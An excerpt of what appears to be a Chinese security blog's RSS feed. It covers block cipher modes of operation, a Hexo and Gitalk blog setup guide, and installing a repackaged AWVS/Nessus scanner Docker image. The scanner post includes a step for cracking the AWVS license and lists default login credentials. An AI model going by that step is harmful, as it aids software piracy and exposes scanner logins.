alt="1598926632436"></p><p>CBC是最为常用的工作模式。它的主要缺点在于<strong>加密过程是串行</strong>的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p><p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，<strong>解密过程可以被并行化</strong>，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p><h3 id="2-3-填充密码块链接（PCBC）"><a href="#2-3-填充密码块链接（PCBC）" class="headerlink" title="2.3 填充密码块链接（PCBC）"></a>2.3 填充密码块链接（PCBC）</h3><p><strong>填充密码块链接</strong>（<strong>PCBC</strong>，Propagating cipher-block chaining）或称为<strong>明文密码块链接</strong>（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。</p><p><a href="https://zh.wikipedia.org/wiki/File:Pcbc_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Pcbc_encryption.png" alt="Pcbc encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Pcbc_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Pcbc_decryption.png" alt="Pcbc decryption.png"></a></p><p>加密和解密算法如下：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926657325.png" alt="1598926657325"></p><p>PCBC主要用于Kerberos v4和WASTE中，而在其它场合的应用较少。对于使用PCBC加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5没有使用PCBC。</p><h3 id="2-4-密文反馈（CFB）"><a href="#2-4-密文反馈（CFB）" class="headerlink" title="2.4 密文反馈（CFB）"></a>2.4 密文反馈（CFB）</h3><p><strong>密文反馈</strong>（CFB，Cipher feedback）模式类似于CBC，可以将块密码变为自同步的<a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E5%AF%86%E7%A0%81">流密码</a>；工作过程亦非常相似，CFB的解密过程几乎就是颠倒的CBC的加密过程：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926692468.png" alt="1598926692468"></p><p><a href="https://zh.wikipedia.org/wiki/File:Cfb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Cfb_encryption.png" alt="Cfb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Cfb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/7/75/Cfb_decryption.png" alt="Cfb decryption.png"></a></p><p>上述公式是描述的是最简单的CFB，在这种模式下，它的自同步特性仅仅与CBC相同，即若密文的一整块发生错误，CBC和CFB都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用CFB的自同步性。</p><p>为了利用CFB制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用IV将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高<em>x</em>位与明文的<em>x</em>进行异或，以产生密文的<em>x</em>位。下一步将生成的<em>x</em>位密文移入寄存器中，并对下面的<em>x</em>位明文重复这一过程。解密过程与加密过程相似，以IV开始，对寄存器加密，将结果的高<em>x</em>与密文异或，产生<em>x</em>位明文，再将密文的下面<em>x</em>位移入寄存器。</p><p>下式中Si是移位寄存器的第<em>i</em>个状态，a &lt;&lt; x是指将<em>a</em>移位<em>x</em>位，head(a, x)是指<em>a</em>的高<em>x</em>位，<em>n</em>则是指IV的位数。</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926716035.png" alt="1598926716035"></p><p>若密文的<em>x</em>位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。</p><p>与CBC相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与CBC类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。</p><p>CFB拥有一些CBC所不具备的特性，这些特性与OFB和CTR的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。</p><h3 id="2-5-输出反馈（OFB）"><a href="#2-5-输出反馈（OFB）" class="headerlink" title="2.5 输出反馈（OFB）"></a>2.5 输出反馈（OFB）</h3><p><strong>输出反馈</strong>模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。</p><p>由于XOR操作的对称性，加密和解密操作是完全相同的：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926747469.png" alt="1598926747469"></p><p><a href="https://zh.wikipedia.org/wiki/File:Ofb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Ofb_encryption.png" alt="Ofb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ofb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Ofb_decryption.png" alt="Ofb decryption.png"></a></p><p>每个使用OFB的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对IV进行加密，最后并行的将明文或密文进行并行的异或处理。</p><p>可以利用输入全0的CBC模式产生OFB模式的密钥流。这种方法十分实用，因为可以利用快速的CBC硬件实现来加速OFB模式的加密过程。</p><h3 id="2-6计数器模式（CTR）"><a href="#2-6计数器模式（CTR）" class="headerlink" title="2.6计数器模式（CTR）"></a>2.6计数器模式（CTR）</h3><p>与OFB相似，CTR将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非CTR模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。</p><p>CTR模式的特征类似于OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR适合运用于多处理器的硬件上。</p><p>注意图中的“nonce”与其它图中的IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。</p><p><a href="https://zh.wikipedia.org/wiki/File:Ctr_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Ctr_encryption.png" alt="Ctr encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ctr_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/3/34/Ctr_decryption.png" alt="Ctr decryption.png"></a></p><p>参考文献：</p><p> <a href="https://blog.csdn.net/xiaoqiaoliushuiCC/article/details/105470567">https://blog.csdn.net/xiaoqiaoliushuiCC/article/details/105470567</a> </p><p><a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F</a> </p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</category>
      
      
      <comments>https://m01ly.github.io/2020/08/31/blockcipher-operation-mode/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hexo踩坑</title>
      <link>https://m01ly.github.io/2020/08/26/hexo-guide/</link>
      <guid>https://m01ly.github.io/2020/08/26/hexo-guide/</guid>
      <pubDate>Wed, 26 Aug 2020 09:33:07 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;0-引言&quot;&gt;&lt;a href=&quot;#0-引言&quot; class=&quot;headerlink&quot; title=&quot;0 引言&quot;&gt;&lt;/a&gt;0 引言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://hexo.io/zh-cn/docs/tag-plugins&quot;&gt;hexo官方指南&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/6844903777321877511&quot;&gt;hexo 命令大全&lt;/a&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://moxfive.xyz/yelee/&quot;&gt;yelee主题官方使用指南&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本博客搭建教程：&lt;a href=&quot;https://blog.csdn.net/qq_36759224/article/details/82121420?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&quot;&gt;使用 Github Pages 和 Hexo 搭建自己的独立博客【超级详细的小白教程】&lt;/a&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0-引言"><a href="#0-引言" class="headerlink" title="0 引言"></a>0 引言</h1><p><a href="https://hexo.io/zh-cn/docs/tag-plugins">hexo官方指南</a> </p><p><a href="https://juejin.cn/post/6844903777321877511">hexo 命令大全</a>：</p><p><a href="http://moxfive.xyz/yelee/">yelee主题官方使用指南</a></p><p>本博客搭建教程：<a href="https://blog.csdn.net/qq_36759224/article/details/82121420?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight">使用 Github Pages 和 Hexo 搭建自己的独立博客【超级详细的小白教程】</a></p><a id="more"></a><h1 id="1-插入图片"><a href="#1-插入图片" class="headerlink" title="1 插入图片"></a>1 插入图片</h1><p>参考：<a href="https://www.dazhuanlan.com/2019/12/18/5df99e24d6d27/">Hexo 无法加载图片（路径问题）</a></p><p><a href="https://www.jianshu.com/p/7f06d10f2e3e">关于hexo博客图片插件问题</a></p><p><a href="https://www.jianshu.com/p/db02d775aed0">在hexo博客添加图片遇到的坑</a></p><h2 id="1-1-配置文件"><a href="#1-1-配置文件" class="headerlink" title="1.1  配置文件"></a>1.1  配置文件</h2><blockquote><p>根目录配置_config.yml里面的post_asset_folder:false这个选项设置为true。Hexo 提供了一种更方便管理 Asset 的设定：post_asset_folder</p><pre><code>post_asset_folder: true</code></pre></blockquote><h2 id="1-2-安装图片插件"><a href="#1-2-安装图片插件" class="headerlink" title="1.2 安装图片插件"></a>1.2 安装图片插件</h2><p>先卸载 hexo-asset-image: npm uninstall hexo-asset-image</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> https://github.com/CodeFalling/hexo-asset-image --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/hexo-guide/1603260802378.png" alt="1603260802378"></p><p>图片居中</p><pre><code>&lt;style&gt;img &#123;  position:relative;  width:60%;  left:15%;/*left为（img父元素元素的width - img元素自己的width)÷2*/&#125;&lt;/style&gt;</code></pre><h1 id="2-建立-about等页面"><a href="#2-建立-about等页面" class="headerlink" title="2  建立 about等页面"></a>2  建立 about等页面</h1><h1 id="3-使用标签和分类"><a href="#3-使用标签和分类" class="headerlink" title="3 使用标签和分类"></a>3 使用标签和分类</h1><p> <strong>注：文章标签可以添加多个，分类却只能有一个，设置多个只有第一个生效。</strong> </p><h2 id="3-1-标签"><a href="#3-1-标签" class="headerlink" title="3.1 标签"></a>3.1 标签</h2><p>在Hexo博客本地根目录右键选择<code>Git Bash</code>（前提是已安装好<code>Git</code>和<code>Node.js</code>,可参照<a href="https://sogrey.github.io/article/%E5%A6%82%E4%BD%95%E5%9C%A8Github-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E4%B8%BB%E9%A1%B5%EF%BC%9F/">如何在Github Pages搭建个人独立主页？</a>）,输入命令：</p><pre><code>hexo new page tags</code></pre><p>回车，提示：</p><pre><code>INFO  Created: ...\source\tags\index.md</code></pre><p>就创建完成了。在<code>source\</code>目录下会多出一个<code>tags</code>文件夹，里面有一个<code>index.md</code>文件，打开该文件输入如下：</p><pre><code>---title: 标签云date: 2017-01-10 22:54:00type: &quot;tags&quot;comments: true---</code></pre><p>其中：<code>title</code>和<code>date</code>是标题和创建时间，<code>type</code>表示类型，值<code>tags</code>表示这是个标签云页面，<code>comments</code>是是否允许评论，<code>true</code>表示允许评论。</p><p>这样标签云页面已经创建好了，部署试一下：</p><h2 id="3-2-分类"><a href="#3-2-分类" class="headerlink" title="3.2 分类"></a>3.2 分类</h2><h3 id="3-2-1-站点配置"><a href="#3-2-1-站点配置" class="headerlink" title="3.2.1 站点配置"></a>3.2.1 站点配置</h3><p>在站点根目录下的<code>_config.yml</code>里有这么一段：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Directory</span>source_dir: <span class="token function">source</span>public_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中：<code>category_dir: categories</code>就是分配分类目录了，没有的可以按这样配置，下面就是创建了。</p><h3 id="3-2-2-创建分类"><a href="#3-2-2-创建分类" class="headerlink" title="3.2.2 创建分类"></a>3.2.2 创建分类</h3><p>跟创建<code>云标签</code>一样：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page categories<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>source</code>目录下生成一个<code>categories\index.md</code>文件，编辑它：</p><pre class="line-numbers language-bash"><code class="language-bash">---date: 2017-01-12 02:23:17title: categoriestype: <span class="token string">"categories"</span>comments: <span class="token boolean">false</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一篇说道<code>type</code>值为<code>tags</code>是标签云，这里是分类<code>categories</code>。就这么简单不用再做其他输入。</p><p><img src="/2020/08/26/hexo-guide/1599186880480.png" alt="1599186880480"></p><h1 id="4-评论系统搭建"><a href="#4-评论系统搭建" class="headerlink" title="4 评论系统搭建"></a>4 评论系统搭建</h1><p>我用的主题版本是3.5的。主题目前支持Disqus，多说[倒闭了]及友言[倒闭了]评论，还有valine,wildfire,gitalk。其中Disqus是国外的第三方评论插件，如果没有翻墙的话，是无法显示的。并且在使用该第三方评论插件的时候，需要先注册才能用。网上发现大家都在用gitalk，因此我也打算入手一波。步骤如下：</p><p><strong>（1）申请ClientID和ClientSecrets</strong></p><p>注册一个 Github OAuth application: <a href="https://github.com/settings/applications/new">https://github.com/settings/applications/new</a></p><p>记下 <code>clientID</code> 和 <code>clientSecret</code></p><p><img src="/2020/08/26/hexo-guide/1613701655740.png" alt="1613701655740"></p><p><img src="/2020/08/26/hexo-guide/1613645427696.png" alt="1613645427696"></p><p><strong>（2）在主题配置文件 _config.yml 中添加</strong></p><p>将on改为true，然后写上第一步申请到的clinetID和 clientSecret，repo可以直接填写博客对应的仓库没，除此之外，还有其他很多参数，有兴趣的话可以 <a href="https://github.com/gitalk/gitalk#options">点这里</a>。 </p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">gitalk</span><span class="token punctuation">:</span>  <span class="token key atrule">on</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">clientID</span><span class="token punctuation">:</span> <span class="token string">'xxxxxx'</span>  <span class="token key atrule">clientSecret</span><span class="token punctuation">:</span> <span class="token string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>  <span class="token key atrule">repo</span><span class="token punctuation">:</span> 'm01ly.github.io'//存储你评论 issue 的 Github 仓库名（建议直接用 GitHub Page 的仓库名）  <span class="token key atrule">owner</span><span class="token punctuation">:</span> <span class="token string">'m01ly'</span>  <span class="token key atrule">admin</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'m01ly'</span><span class="token punctuation">]</span>//这个仓库的管理员，可以有多个，用数组表示，一般写自己<span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后部署上线，就会看到未找到相关的Issues进行评论，并且有个404错误，这里忘记截图啦，然后网上看了原因，什么字段太长啥的都不是，后面看F12，查看404错误的原因，点击链接进入下图，然后点击access后，再刷新页面，登录github账号，就可以啦。</p><p><img src="/2020/08/26/hexo-guide/1613714256885.png" alt="1613714256885"></p><p>但是有个小问题，Gitalk 需要你点开每篇文章的页面才会创建对应的 issue,文章多的人，可以参考<a href="https://draveness.me/git-comments-initialize">这篇 自动初始化Gitalk和Gitment评论</a>就解决了这个问题。</p><p><img src="/2020/08/26/hexo-guide/1613714581563.png" alt="1613714581563"></p><p>参考：</p><p><a href="http://github.shadowwu.club/2017/12/19/Gittalk%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%B5%8B%E8%AF%95/">为博客添加 Gitalk 评论插件</a></p><p><a href="https://draveness.me/git-comments-initialize">自动初始化Gitalk和Gitment评论</a></p><h1 id="5-基本命令使用"><a href="#5-基本命令使用" class="headerlink" title="5 基本命令使用"></a>5 基本命令使用</h1><p>在根目录下blog/Hexo下右击，点击“git bash here”，然后进行文章的发布管理等。</p><p><img src="/2020/08/26/hexo-guide/1613635158320.png" alt="1613635158320"></p><p>hexo部分常用命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo n <span class="token string">"博客名称"</span>  <span class="token operator">=</span><span class="token operator">></span> hexo new <span class="token string">"博客名称"</span>   <span class="token comment" spellcheck="true">#这两个都是创建新文章，前者是简写模式</span>$ hexo clean <span class="token comment" spellcheck="true">#清空本地导出的博客</span>$ hexo g  <span class="token operator">=</span><span class="token operator">></span> hexo generate  <span class="token comment" spellcheck="true">#生成</span>$ hexo s  <span class="token operator">=</span><span class="token operator">></span> hexo server  <span class="token comment" spellcheck="true">#本地服务器浏览</span>$ hexo d  <span class="token operator">=</span><span class="token operator">></span> hexo deploy  <span class="token comment" spellcheck="true">#部署</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server   <span class="token comment" spellcheck="true">#Hexo 会监视文件变动并自动更新，无须重启服务器。</span>$ hexo server -s   <span class="token comment" spellcheck="true">#静态模式</span>$ hexo server -p 5000   <span class="token comment" spellcheck="true">#更改端口</span>$ hexo server -i 192.168.1.1   <span class="token comment" spellcheck="true">#自定义IP</span>$ hexo clean   <span class="token comment" spellcheck="true">#清除缓存，网页正常情况下可以忽略此条命令</span>$ hexo g   <span class="token comment" spellcheck="true">#生成静态网页</span>$ hexo d   <span class="token comment" spellcheck="true">#开始部署</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-注意事项"><a href="#6-注意事项" class="headerlink" title="6 注意事项"></a>6 注意事项</h1><p>md文件命名最好英文</p><p>用yelee主题的博客：</p><p><a href="https://www.gokuweb.com/web/39c1ec60.html">https://www.gokuweb.com/web/39c1ec60.html</a> </p><p><a href="https://sogrey.top/article/">https://sogrey.top/article/</a> </p><p>  [<a href="https://durant35.github.io/2016/09/16/hexo_Theme%20Yelee%20Migrant%20Note/#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF]">https://durant35.github.io/2016/09/16/hexo_Theme%20Yelee%20Migrant%20Note/#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF]</a>(<a href="https://durant35.github.io/2016/09/16/hexo_Theme">https://durant35.github.io/2016/09/16/hexo_Theme</a> Yelee Migrant Note/#自定义版权信息)   好的文章推荐–待安装</p><p> <a href="https://os_heartstill.gitee.io/chih-ping/2019/05/10/Hexo%E7%9A%84Yelee%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">https://os_heartstill.gitee.io/chih-ping/2019/05/10/Hexo%E7%9A%84Yelee%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</a> </p><h1 id="7-常见报错"><a href="#7-常见报错" class="headerlink" title="7 常见报错"></a>7 常见报错</h1><p><strong>hexo s报错如下：</strong></p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo gINFO  Validating configINFO  Start processingFATAL <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  err: TypeError <span class="token punctuation">[</span>ERR_INVALID_URL<span class="token punctuation">]</span>: Invalid URL: http://www.linuxidc.com<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#</span>      at onParseError <span class="token punctuation">(</span>internal/url.js:256:9<span class="token punctuation">)</span>      at new URL <span class="token punctuation">(</span>internal/url.js:332:5<span class="token punctuation">)</span>      at encodeURL <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-util\lib\encode_url.js:8:20<span class="token punctuation">)</span>      at Renderer.link <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-renderer-marked\lib\renderer.js:56:27<span class="token punctuation">)</span>      at Parser.parseInline <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:211:27<span class="token punctuation">)</span>      at Parser.parse <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:162:47<span class="token punctuation">)</span>      at Function.parse <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:27:19<span class="token punctuation">)</span>      at marked <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\marked.js:110:19<span class="token punctuation">)</span>      at Hexo.module.exports <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-renderer-marked\lib\renderer.js:138:10<span class="token punctuation">)</span>      at Hexo.tryCatcher <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\util.js:16:23<span class="token punctuation">)</span>      at Hexo.<span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\method.js:15:34<span class="token punctuation">)</span>      at C:\blog\Hexo\node_modules\hexo\lib\hexo\render.js:75:22      at tryCatcher <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\util.js:16:23<span class="token punctuation">)</span>      at Promise._settlePromiseFromHandler <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:547:31<span class="token punctuation">)</span>      at Promise._settlePromise <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:604:18<span class="token punctuation">)</span>      at Promise._settlePromiseCtx <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:641:10<span class="token punctuation">)</span>      at _drainQueueStep <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:97:12<span class="token punctuation">)</span>      at _drainQueue <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:86:9<span class="token punctuation">)</span>      at Async._drainQueues <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:102:5<span class="token punctuation">)</span>      at Immediate.Async.drainQueues <span class="token punctuation">[</span>as _onImmediate<span class="token punctuation">]</span> <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:15:14<span class="token punctuation">)</span>      at processImmediate <span class="token punctuation">(</span>internal/timers.js:456:21<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    input: <span class="token string">'http://www.linuxidc.com]#'</span>,    code: <span class="token string">'ERR_INVALID_URL'</span>  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; Something's wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/08/26/hexo-guide/1613635511527.png" alt="1613635511527"></p><p><strong>solution：</strong></p><p>后面发现是因为代码格式的代码有问题，所以造成报错。</p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2020/08/26/hexo-guide/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AWVS和Nessus镜像安装</title>
      <link>https://m01ly.github.io/2020/08/26/scan-awvs-nessus/</link>
      <guid>https://m01ly.github.io/2020/08/26/scan-awvs-nessus/</guid>
      <pubDate>Wed, 26 Aug 2020 09:33:07 GMT</pubDate>
      
      <description>&lt;p&gt;文章来自：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&amp;mid=2247498179&amp;idx=2&amp;sn=fa6f117c420bc52306508fe81af3b4d3&amp;chksm=ec26d85bdb51514d6def0629e0c71ed5506b1939a9f69b30ff47d977fab8cc96dc15af16fb1c&amp;mpshare=1&amp;scene=23&amp;srcid=1031d22NMZJcOV53f1sF2DPA&amp;sharer_sharetime=1604139889173&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd&quot;&gt;漏洞扫描—Awvs&amp;amp;Nessus(Docker版V3.0)–雷石安全&lt;/a&gt;,雷石实验室维护的AWVS和Nessus镜像，可以去&lt;a href=&quot;https://hub.docker.com/r/leishianquan/awvs-nessus/tags?page=1&amp;ordering=last_updated&quot;&gt;docker hub&lt;/a&gt;上查看最新版本&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>文章来自：<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247498179&idx=2&sn=fa6f117c420bc52306508fe81af3b4d3&chksm=ec26d85bdb51514d6def0629e0c71ed5506b1939a9f69b30ff47d977fab8cc96dc15af16fb1c&mpshare=1&scene=23&srcid=1031d22NMZJcOV53f1sF2DPA&sharer_sharetime=1604139889173&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">漏洞扫描—Awvs&amp;Nessus(Docker版V3.0)–雷石安全</a>,雷石实验室维护的AWVS和Nessus镜像，可以去<a href="https://hub.docker.com/r/leishianquan/awvs-nessus/tags?page=1&ordering=last_updated">docker hub</a>上查看最新版本</p><a id="more"></a><h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><p>pull 拉取下载镜像</p><pre class="line-numbers language-bash"><code class="language-bash">docker pull leishianquan/awvs-nessus:v4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -d -p 13443:3443 -p 8834:8834 leishianquan/awvs-nessus:v4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是访问Nessus需要进入容器启动Nessus 服务：</p><p>查看容器</p><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">ps</span> -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动容器</p><pre class="line-numbers language-bash"><code class="language-bash">docker start 容器id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入容器</p><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">exec</span> -it 容器id <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装nessus时区</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> tzdata:Asia/Shanghai<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动nessus服务</p><pre class="line-numbers language-bash"><code class="language-bash">/etc/init.d/nessusd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/scan-awvs-nessus/1616051151150.png" alt="1616051151150"></p><p>破解awvs：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /home/license_info.json /home/acunetix/.acunetix/data/license/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2 使用"></a>2 使用</h1><p><strong>Nessus:</strong></p><p><a href="https://127.0.0.1:8834/#/">https://127.0.0.1:8834/#/</a></p><p>nessus username:leishi</p><p>nessus password:leishianquan</p><p><strong>Awvs</strong>：</p><p><a href="https://127.0.0.1:13443/">https://127.0.0.1:13443/</a></p><p>awvs13 username: <a href="mailto:&#108;&#x65;&#x69;&#x73;&#x68;&#105;&#x40;&#108;&#x65;&#105;&#x73;&#x68;&#x69;&#x2e;&#x63;&#111;&#x6d;">&#108;&#x65;&#x69;&#x73;&#x68;&#105;&#x40;&#108;&#x65;&#105;&#x73;&#x68;&#x69;&#x2e;&#x63;&#111;&#x6d;</a></p><p>awvs13 password: Leishi123</p><h1 